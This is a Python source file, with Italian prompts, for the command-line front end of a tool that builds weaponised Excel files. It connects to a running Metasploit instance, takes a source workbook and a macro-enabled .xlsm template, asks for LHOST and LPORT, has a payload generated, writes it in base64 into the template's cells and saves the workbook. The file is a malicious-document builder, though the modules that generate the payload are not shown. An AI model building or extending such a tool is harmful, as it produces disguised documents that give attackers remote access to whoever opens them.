from utils import CustomLogger
from excel_handler import ExcelHandler
from payload_handler import PayloadHandler

class Cli:
    def __init__(self, logger: CustomLogger, excel_handler: ExcelHandler, payload_handler: PayloadHandler):
        self.logger = logger
        self.excel_handler = excel_handler
        self.payload_handler = payload_handler

    def get_user_input(self, prompt: str, default: str = None, cast_func=None, required: bool = True):
        """
        Richiede un input all'utente, gestisce il caso 'exit' e l'eventuale default/casting.
        Se il campo è obbligatorio (required=True) e l'input è vuoto, viene ripetuta la richiesta.
        """
        while True:
            user_input = input(prompt).strip()
            if user_input.lower() == "exit":
                self.logger.info("Uscita dall'applicazione.")
                exit(0)
            if user_input == "":
                if default is not None:
                    return default
                if required:
                    self.logger.error("Questo campo è obbligatorio. Riprova.")
                    continue
            if cast_func:
                try:
                    return cast_func(user_input)
                except ValueError:
                    self.logger.error("Input non valido, riprova.")
            else:
                return user_input

    def start(self):
        self.logger.info('Starting...')
        self.logger.info("Avvia Msfconsole prima di cominciare e invia il comando 'load msgrpc'")
        self.logger.info('Salva la password e non chiudere Msfconsole!')
        input("Premi invio quando sei pronto!")
        self.logger.info("Scrivi in qualsiasi momento 'exit' per uscire")
        self.logger.info('Inserisci i parametri richiesti')

        # Richiede il percorso del file Excel sorgente fino a che non è valido
        while True:
            excel = self.get_user_input("Percorso del file Excel sorgente (.xlsx): ")
            self.excel_handler.filename = excel
            try:
                self.logger.info("Concedi i permessi ad Excel quando richiesti")
                self.excel_handler.load_source()
                break
            except Exception as ex:
                self.logger.error(str(ex))

        # Richiede il percorso del file template fino a che non è valido
        while True:
            tpl = self.get_user_input("Percorso del file template (.xlsm) contenente macro: ")
            self.excel_handler.template = tpl
            try:
                self.logger.info("Concedi i permessi ad Excel quando richiesti")
                self.excel_handler.load_template()
                break
            except Exception as ex:
                self.logger.error(str(ex))

        # Parametri per Metasploit
        msf_password_input = self.get_user_input("Password per Metasploit: ", required=True)
        msf_host_input = self.get_user_input("Indirizzo host di Metasploit (default 127.0.0.1): ", default="127.0.0.1")
        msf_port = self.get_user_input("Porta di Metasploit (default 55552): ", default="55552", cast_func=int)

        # Gestione del payload
        while True:
            payload_flag = self.get_user_input("Generare payload e inserirlo nel template? (s/n/e): ").lower()
            if payload_flag.startswith('e'):
                self.logger.info("Uscita dall'applicazione.")
                exit(0)
            elif payload_flag.startswith('s'):
                generate_payload = True
                lhost = self.get_user_input("Indirizzo LHOST per il payload (default 127.0.0.1): ", default="127.0.0.1")
                lport = self.get_user_input("Porta LPORT per il payload (default 4444): ", default="4444", cast_func=int)
                break
            elif payload_flag.startswith('n'):
                generate_payload = False
                lhost = None
                lport = None
                break
            else:
                self.logger.info("Input non valido. Inserisci 's' per sì, 'n' per no o 'e' per uscire.")

        # Imposta i parametri di connessione in PayloadHandler
        self.payload_handler.password = msf_password_input
        self.payload_handler.host = msf_host_input
        self.payload_handler.port = msf_port

        # Gestione della connessione a Metasploit
        while True:
            try:
                client = self.payload_handler.connect()
                break
            except Exception as ex:
                self.logger.error(str(ex))
                retry = self.get_user_input("Ritentare la connessione? (s/n): ").lower()
                if not retry.startswith('s'):
                    self.logger.info("Uscita dal programma.")
                    exit(1)
                else:
                    self.logger.info("Ritento la connessione...")

        self.excel_handler.copy_content()
        if generate_payload:
            payload_b64 = self.payload_handler.generate_payload(lhost, lport)
            if payload_b64:
                self.excel_handler.write_payload_to_cells(payload_b64)
            else:
                self.logger.error("Generazione del payload fallita.")
        self.excel_handler.save_workbook()
